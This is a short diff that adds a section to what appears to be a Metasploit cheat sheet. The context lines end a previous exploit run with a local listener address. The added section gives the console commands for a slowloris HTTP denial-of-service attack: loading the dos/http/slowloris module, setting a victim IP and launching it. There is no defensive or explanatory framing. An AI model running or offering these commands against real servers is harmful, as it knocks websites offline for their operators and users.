@@ -92,3 +92,15 @@ set LHOST 192.168.1.5
 exploit
 ```
 ---
+# use slowloris to http dos attack
+ ```
+ msf6 > use dos/http/slowloris
+ ```
+ ```
+ msf6 > set RHOST <victim ip>
+ ```
+
+ ```
+ msf6 > exploit
+ ```
+ 
